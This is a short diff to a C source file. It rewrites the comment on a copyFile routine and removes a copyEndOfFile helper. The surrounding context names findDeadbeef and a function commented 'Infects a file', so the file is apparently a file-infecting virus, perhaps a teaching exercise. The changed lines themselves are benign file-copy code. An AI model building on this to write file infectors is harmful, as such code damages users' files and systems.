@@ -64,7 +64,8 @@ long findDeadbeef(FILE *file) {
 }
 
 /*
- * Copies content from src file to dest file starting from startPos
+ * Copies content from src file to dest file from startPos to endPos.
+ * If endPos is EOF, copies to the end of the file.
  * Returns 0 on success, -1 on failure.
  */
 int copyFile(FILE *src, FILE *dest, long startPos, long endPos) {
@@ -103,23 +104,6 @@ int copyFile(FILE *src, FILE *dest, long startPos, long endPos) {
     }
     return 0;
 }
-
-/*
- * Copies content from src file to dest file starting from startPos to the end of the file
- * Returns 0 on success, -1 on failure.
- */
- int copyEndOfFile(FILE *src, FILE *dest, long startPos) {
-    // Find the end of file position
-    if(fseek(src, 0, SEEK_END) < 0) {
-        perror("Could not seek to end of file");
-        return -1;
-    }
-    long endPos = ftell(src);
-
-    // Copy
-    return copyFile(src, dest, startPos, endPos);
- }
-
 
 /*
  * Infects a file
